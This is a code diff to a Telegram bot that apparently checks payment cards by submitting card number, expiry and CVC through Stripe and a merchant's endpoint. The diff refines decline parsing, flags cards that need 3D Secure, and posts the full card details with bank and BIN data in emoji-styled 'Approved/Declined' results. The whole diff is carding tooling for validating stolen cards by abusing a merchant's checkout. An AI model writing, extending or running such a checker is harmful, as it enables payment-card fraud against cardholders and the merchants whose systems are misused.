@@ -73,9 +73,19 @@ def check_card(card_number, exp_month, exp_year, cvc):
         stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=STRIPE_HEADERS, data=stripe_data)
         
         if stripe_response.status_code != 200:
-            stripe_json = stripe_response.json()
-            error_message = stripe_json.get('error', {}).get('message', 'Unknown error')
-            return f"Declined - {error_message}"
+            try:
+                stripe_json = stripe_response.json()
+                error_data = stripe_json.get('error', {})
+                error_message = error_data.get('message', 'Unknown Stripe error')
+                error_type = error_data.get('type', '')
+                
+                # Return more specific Stripe error
+                if error_type:
+                    return f"Declined - {error_type}: {error_message}"
+                else:
+                    return f"Declined - {error_message}"
+            except:
+                return f"Declined - Stripe API error (Status: {stripe_response.status_code})"
         
         stripe_json = stripe_response.json()
         payment_method_id = stripe_json.get('id')
@@ -102,30 +112,38 @@ def check_card(card_number, exp_month, exp_year, cvc):
             try:
                 wiseacre_json = wiseacre_response.json()
                 
+                # Debug: Print the full JSON response for troubleshooting
+                print(f"Wiseacre Response JSON: {wiseacre_json}")
+                
                 # Check for success
                 if wiseacre_json.get('success'):
-                    return "Payment method added successful"
-                
-                # Check for specific error messages
-                error_data = wiseacre_json.get('data', {})
-                error_message = error_data.get('message', 'Unknown error')
-                
-                # Parse common error messages
-                if 'declined' in error_message.lower():
-                    return "Your card was declined"
-                elif 'insufficient' in error_message.lower():
-                    return "Insufficient funds"
-                elif 'expired' in error_message.lower():
-                    return "Card expired"
-                elif 'invalid' in error_message.lower():
-                    return "Invalid card"
-                elif 'blocked' in error_message.lower():
-                    return "Card blocked"
-                else:
-                    return f"Declined - {error_message}"
+                    data = wiseacre_json.get('data', {})
+                    status = data.get('status', '')
                     
-            except:
-                return "Declined - Invalid response"
+                    # Check if 3D Secure is required
+                    if status == 'requires_action':
+                        return "3D Secure Required - Card needs authentication"
+                    elif status == 'succeeded':
+                        return "Payment method added successful"
+                    else:
+                        return "Payment method added successful"
+                
+                # Extract exact error message from JSON structure
+                error_data = wiseacre_json.get('data', {})
+                
+                # Check if error is nested in data.error.message structure
+                if 'error' in error_data and 'message' in error_data['error']:
+                    error_message = error_data['error']['message']
+                elif 'message' in error_data:
+                    error_message = error_data['message']
+                else:
+                    error_message = 'Unknown error'
+                
+                # Return the exact error message from Stripe
+                return f"Declined - {error_message}"
+                    
+            except Exception as e:
+                return f"Declined - Invalid response: {str(e)}"
         else:
             return "Declined - Server error"
             
@@ -246,6 +264,9 @@ async def check_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE,
     if "Payment method added successful" in result:
         status_emoji = "✅"
         status_title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
+    elif "3D Secure Required" in result:
+        status_emoji = "🔐"
+        status_title = "𝟯𝗗 𝗦𝗲𝗰𝘂𝗿𝗲"
     elif "declined" in result.lower() or "insufficient" in result.lower() or "expired" in result.lower() or "invalid" in result.lower() or "blocked" in result.lower():
         status_emoji = "❌"
         status_title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
@@ -253,15 +274,18 @@ async def check_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE,
         status_emoji = "⚠️"
         status_title = "𝙀𝙧𝙧𝙤𝙧"
     
+    # Format card details
+    full_card = f"{cc}|{card_data['month']}|{card_data['year']}|{card_data['cvc']}"
+    
     msg = f'''<b>{status_emoji} {status_title} {status_emoji}</b>	   
-<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
+<b>[↯] 𝗖𝗖 ⇾</b> <code>{full_card}</code>
 <b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
 <b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
 <b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {bin_info['type']} - {bin_info['brand']}
 <b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bin_info['bank']}
 <b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {bin_info['country']} {bin_info['flag']}
 <b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
-<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @Rar_Xd'''
+<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @manrsx'''
     
     # Edit the processing message with results
     await processing_msg.edit_text(msg, parse_mode='HTML')
